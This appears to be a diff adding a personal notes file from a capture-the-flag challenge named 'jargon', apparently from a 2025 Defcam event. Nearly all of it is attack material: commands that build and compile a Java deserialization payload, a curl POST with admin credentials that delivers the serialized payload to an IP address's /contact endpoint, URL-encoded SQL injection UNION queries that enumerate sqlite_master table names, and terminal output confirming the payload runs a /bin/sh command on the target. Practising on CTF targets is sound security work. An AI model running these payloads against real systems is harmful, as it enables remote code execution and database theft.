@@ -1,0 +1,16 @@
+javac -cp jargon_unpacked MakePayload.java
+java -cp .:jargon_unpacked MakePayload
+
+curl -u admin:password123 -X POST \
+  -H "Content-Type: application/octet-stream" \
+  --data-binary @payload.ser \
+  "http://34.89.179.154:31546/contact"
+
+-1+UNION+SELECT+1,name,3+FROM+sqlite_master+WHERE+type%3d'table'+LIMIT+1+OFFSET+0--  
+-1+UNION+SELECT+1,name,3+FROM+sqlite_master+WHERE+type%3d'table'+LIMIT+1+OFFSET+1--  234
+
+tiwza@tiwza-ASUS-Zenbook-14-UX3405MA-UX3405MA:~/Documents/CTF/2025/Defcam/decompiled_src$ javac ctf/jargon/Exploit.java ctf/jargon/PayloadBuilder.java
+tiwza@tiwza-ASUS-Zenbook-14-UX3405MA-UX3405MA:~/Documents/CTF/2025/Defcam/decompiled_src$ java ctf.jargon.MakePayload
+[+] payload.ser created (Exploit -> executes: /bin/sh -c "ls -la / > /app/uploads/root.txt")
+
+
